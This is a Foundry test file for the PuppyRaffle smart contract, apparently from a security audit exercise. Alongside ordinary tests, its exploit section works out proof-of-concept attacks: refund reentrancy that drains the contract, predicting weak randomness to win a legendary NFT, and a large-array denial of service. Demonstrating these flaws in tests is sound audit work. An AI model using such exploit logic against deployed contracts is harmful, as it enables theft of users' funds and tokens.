// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console, Vm} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {ReentrancyContract} from "./ReentrancyContract.sol";
import {ReentrancyRandomnessChain} from "./ReentrancyAndRandomnessChain.sol";


contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address attacker = address(31337);
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }


    //////////////////////
    /// EXPLOITS       ///
    /////////////////////

    function testReentrancyRandomnesChain() public {
        // Stage 0: Start to record logs and start raffle than wait to raffle end
        // That imitates malicious user who monitors the logs and tries to exploit the system
        vm.recordLogs();
        // Users enter the raffle
        address[] memory players1 = new address[](3);
        players1[0] = playerOne;
        players1[1] = playerTwo;
        players1[2] = playerThree;
        
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players1);

        address[] memory players2 = new address[](2);
        players2[0] = playerFour;
        players2[1] = address(5);
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players2);

        // DEBUG: check logs

        // Raffle ends
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        
        // Attacker generates address that he controlls and will always win Legendary item
        // From here he operates from that address. After refound array size will be the same.
        address legendaryAddress = findLegendaryAddress();

        // Retrieve the recorded logs and current players
        Vm.Log[] memory logs = vm.getRecordedLogs();
        uint256 playerCount = getPlayerCount( logs );
        console.log("Player count: ", playerCount);
        uint attackerIndex = playerCount; 

        // Deploy malisous contract when raffle ends. Legendary address will be the one who will call select winner. 
        uint numberOfMalicousPlayers = 500;
        uint attackFunds = entranceFee * numberOfMalicousPlayers;
        vm.deal(legendaryAddress, attackFunds);
        vm.startPrank(legendaryAddress);
        ReentrancyRandomnessChain reentrancyContract = new ReentrancyRandomnessChain{value: attackFunds-1 }(address(puppyRaffle), legendaryAddress,playerCount);

        reentrancyContract.attack();

    }

    function testRandonNumberSelectWinner() public {

        // Stage 0: Start to record logs and start raffle than wait to raffle end
        // That imitates malicious user who monitors the logs and tries to exploit the system
        vm.recordLogs();
        // Users enter the raffle
        address[] memory players1 = new address[](3);
        players1[0] = playerOne;
        players1[1] = playerTwo;
        players1[2] = playerThree;
        
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players1);

        address[] memory players2 = new address[](2);
        players2[0] = playerFour;
        players2[1] = address(5);

        puppyRaffle.enterRaffle{value: entranceFee * 2}(players2);

        // CHAIN 1: deploy reentrancy contract and add it later to the raffle 
        ReentrancyContract reentrancyContract = new ReentrancyContract{value: entranceFee}(address(puppyRaffle), attacker, 0);

        // DEBUG: check logs
        // Retrieve the recorded logs
        Vm.Log[] memory logs = vm.getRecordedLogs();
        uint256 playerCount = getPlayerCount( logs );

        // RAFFLE OVER
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        // -----------------

        // To arrays of legit players and one malicious reentrancy
        assertEq(playerCount, players1.length + players2.length + 1, "Player count does not match the expected value");

        // Stage 1: Count address that always will generate legendary item 
        address legendaryAddress = findLegendaryAddress();

        // Stage 2:Predict how many address add to  became a winner
        uint attackerIndex = playerCount; // The attacker is the last player and we counting from 0, I added it to make it clear

        
        // Winner prediction 
        uint256 playersNeeded = predictPlayersNeeded(attackerIndex, legendaryAddress);
        // Attacker gets founds for attack (flashLoan or anything)
        assertEq(address(attacker).balance, 0, "Attacker balance should be 0");
        deal(attacker, puppyRaffle.entranceFee() * playersNeeded);

        // Attacker is founding legendary account
        vm.prank(attacker);
        // We are delaing a lot of ETH as attack might be expensive
        payable(legendaryAddress).transfer(puppyRaffle.entranceFee() * playersNeeded);
        assertLe(puppyRaffle.entranceFee() * playersNeeded, address(legendaryAddress).balance, "Legendary address did not receive the funds");
        
        //deal(legendaryAddress, puppyRaffle.entranceFee() * playersNeeded);
        vm.startPrank(legendaryAddress);

        // Stage 3: Add the necessary number of players to the raffle
        uint256 playersNeededToBeAdd = playersNeeded - playerCount ;
        address[] memory maliciousAddresses = new address[](playersNeededToBeAdd);
        maliciousAddresses[0] = legendaryAddress;   
        
        // // Add the necessary number of players to the raffle
        for (uint256 p = 2; p < playersNeededToBeAdd; p++) {
            address playerAddress = address( uint160(p+100) );
            maliciousAddresses[p] = playerAddress;   
        }

        puppyRaffle.enterRaffle{value: entranceFee * (playersNeededToBeAdd)} (maliciousAddresses);
        vm.stopPrank();

        // CHAIN 2: reentrancy contract attack - attack must be stoped before needed prize will be drained
        vm.startPrank(attacker);
        uint256 totalAmountCollected = entranceFee * (playersNeeded);
        uint256 prizePool = (totalAmountCollected * 80) / 100 +1;
        reentrancyContract.setDrainEdge( prizePool + entranceFee);
        reentrancyContract.attack();
        vm.stopPrank();

        // Stage 4: Select the winner
        vm.prank(legendaryAddress);
        puppyRaffle.selectWinner();

        // Check if attack succeded
        // Legendary address should be the winner
        assertEq(puppyRaffle.previousWinner(), legendaryAddress);
        // Legendary address should have the legendary prize
        uint256 tokenId = puppyRaffle.tokenOfOwnerByIndex(legendaryAddress, 0); // We can assume that this is only attacker's token for test purpse 
        uint256 rarity = puppyRaffle.tokenIdToRarity(tokenId);// Take rarity of stolen token
        uint256 LEGENDARY_RARITY = puppyRaffle.LEGENDARY_RARITY();
        assertEq(rarity, LEGENDARY_RARITY, "Legendary address did not receive a legendary rarity token");
        // Transfer the token from the legendary address to the attacker
        vm.prank(legendaryAddress);
        puppyRaffle.transferFrom(legendaryAddress, attacker, tokenId);

        // Verify the transfer
        address newOwner = puppyRaffle.ownerOf(tokenId);
        assertEq(newOwner, attacker, "Token was not transferred to the attacker");
    }

    function predictPlayersNeeded(uint _attackerIndex, address _attacker) public view returns (uint256 _playerCount) {
        // As this is minium number of players there is no need to iterate from 0
        uint256 playerCount = 4;
        while (true) {
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(_attacker, block.timestamp,block.difficulty))) % (playerCount);
            if (winnerIndex == _attackerIndex) {
                return playerCount;
            }
            playerCount++;
        }
    }
    
    function getPlayerCount(Vm.Log[] memory logs) public pure returns (uint256) {
        uint256 playerCount = 0;
        for (uint256 j = 0; j < logs.length; j++) {
            if (logs[j].topics[0] == keccak256("RaffleEnter(address[])")) {
                // Decode the data to get the player addresses
                address[] memory newPlayers = abi.decode(logs[j].data, (address[]));
                playerCount += newPlayers.length;
            }
        }
        return playerCount;
}

    function findLegendaryAddress() public view returns (address _legendaryAddress) {
        uint256 rareThreshold = puppyRaffle.RARE_RARITY();
        uint256 commonThreshold = puppyRaffle.COMMON_RARITY();
        uint256 legendaryThreshold = rareThreshold + commonThreshold + 1;

        address legendaryAddress;
        uint256 rarity;
        uint256 i = 0;
        while (true) {
            rarity = uint256(keccak256(abi.encodePacked(legendaryAddress, block.difficulty))) % 100;
            if (rarity > legendaryThreshold) {
                break;
            }
            legendaryAddress = address(uint256(keccak256(abi.encodePacked(i, block.difficulty))));
            i++;
        }
        console.log("Legendary address found after ", i, " iterations");
        return legendaryAddress;
}

    function testRefundReentrancy() public {

        // Stage 0: Deploy malicious contract
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        deal(playerOne, puppyRaffle.entranceFee() * 5);
        vm.prank(playerOne);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        uint256 contractBalanceBefore = address(puppyRaffle).balance;

        // Stage 1: Deploy malicious contract
        vm.deal(attacker, entranceFee);
        uint256 attackContractBalanceBefore = address(attacker).balance;
        vm.startPrank(attacker);
        // Added drainEdge parameter to allow attack to decide how many founds he is willing to left in the contract
        uint256 drainEdge = entranceFee;
        ReentrancyContract reentrancyContract = new ReentrancyContract{value: entranceFee}(address(puppyRaffle), attacker, drainEdge);


        // Stage 2: Invoke attack function
        reentrancyContract.attack();

        // Stage 3: Verify that the attacker has successfully withdrawn the prize
        uint256 attackContractBalanceAfter = address(attacker).balance;
        
        assertGt(attackContractBalanceAfter, attackContractBalanceBefore);
        assertLt(address(puppyRaffle).balance, entranceFee);
        vm.startPrank(attacker);

    }


    function testEnterRaffleDoS() public {
        uint256 largeArraySize = 10000; // Adjust this size based on gas limits and testing environment
        address[] memory largeArray = new address[](largeArraySize);
        for (uint256 i = 0; i < largeArraySize; i++) {
            largeArray[i] = address(uint160(i));
        }

        // Fund the attacker to cover entrance fees
        deal(attacker, puppyRaffle.entranceFee() * largeArraySize);
        vm.txGasPrice(1);
        uint256 gasStart = gasleft();
        // Try to enter the raffle with the large array

        vm.startPrank(attacker);
        try puppyRaffle.enterRaffle{value: puppyRaffle.entranceFee() * largeArraySize}(largeArray) {
            emit log("The DoS attack was successful, which is unexpected.");
        } catch {
            emit log("The DoS attack failed as expected due to high gas consumption.");
        }
        uint256 gasEnd = gasleft();
        uint256 gasUsed = (gasStart - gasEnd)*tx.gasprice;                
        console.log("AL:", gasUsed);
        vm.stopPrank();
    }

 

    function testCanEnterWithDuplicatePlayersAcrossMultipleCalls() public {
        // STAGE 1: Introduce 0 aaaaaddress account at index 2
        address[] memory exploitArray = new address[](4);
        puppyRaffle.enterRaffle{value: entranceFee* 4 }(exploitArray);
        exploitArray[0] = address(0);
        // exploitArray[1] = playerOne;
        // exploitArray[2] = playerTwo;
        // exploitArray[3] = playerThree;
        // puppyRaffle.enterRaffle{value: entranceFee* 4}(exploitArray);

        // address[] memory exploitArray2 = new address[](4);
        // exploitArray2[0] = playerFour;
        // exploitArray2[1] = address(5);
        // exploitArray2[2] = address(6);
        // exploitArray2[3] = address(7);
        // puppyRaffle.enterRaffle{value: entranceFee* 4}(exploitArray2);
        // Verify that the players array has duplicates
        // for (uint i = 0; i < 4; i++) {
        //     console.log(puppyRaffle.players(i));
        // }
        // Check if address(0) is introduced
        // assertEq(puppyRaffle.players(0), playerOne);
        // assertEq(puppyRaffle.players(1), address(0));
        // assertEq(puppyRaffle.players(2), playerTwo);
        


    }


}
